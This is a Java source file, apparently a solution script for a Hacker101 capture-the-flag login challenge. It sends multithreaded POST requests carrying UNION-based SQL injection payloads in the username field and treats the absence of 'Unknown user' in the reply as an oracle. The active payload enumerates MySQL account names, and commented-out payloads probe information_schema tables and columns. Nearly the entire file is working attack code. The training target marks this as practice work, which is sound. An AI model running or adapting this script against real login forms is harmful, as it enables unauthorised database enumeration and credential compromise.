package org.example;



import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class Main {
    public static void main(String[] args) {
        String username = "' UNION SELECT table_name from information_schema.columns where table_schema = 'mysql' and table_name = 'user' and column_name like 'use%';--";
        for(char ch = '0'; ch <= '9'; ++ch) {
            final char c = ch;
            new Thread(()-> {
           //   sql_injection(String.format("' UNION SELECT table_name from information_schema.tables where table_schema = 'mysql' and table_name like '%s' ;--",    "use" + c + "%" ));
     //   sql_injection(String.format("' UNION SELECT table_name from information_schema.columns where table_schema = 'mysql' and table_name = 'user' and column_name like '%s';--" ,    "user" ));
         sql_injection(String.format("' UNION SELECT user  from mysql.user u where  u.user like '%s';--" , "root" + c + "%" ));
            }).start();
        }
    }

    static public void sql_injection(String username) {
        {
            String endpointUrl = "https://2be154dedc4aa9a775f6b0e1374a8971.ctf.hacker101.com/login"; // Replace with your endpoint URL
            String password = "";

            try {
                // Create URL object
                URL url = new URL(endpointUrl);

                // Create HttpURLConnection object
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();

                // Set request method
                connection.setRequestMethod("POST");

                // Set headers
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                // Enable output and disable caching
                connection.setDoOutput(true);
                connection.setUseCaches(false);

                // Create the request body
                String requestBody = "username=" + username + "&password=" + password;

                // Write the request body to the connection's output stream
                try (DataOutputStream out = new DataOutputStream(connection.getOutputStream())) {
                    out.write(requestBody.getBytes(StandardCharsets.UTF_8));
                }

                // Get the response code
                int responseCode = connection.getResponseCode();

                // Read response body
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Print response
                if (!response.toString().contains("Unknown user")) {
                    System.out.println("this is username " + username);
                }

                // Close connection
                connection.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
// database level2
// tbales
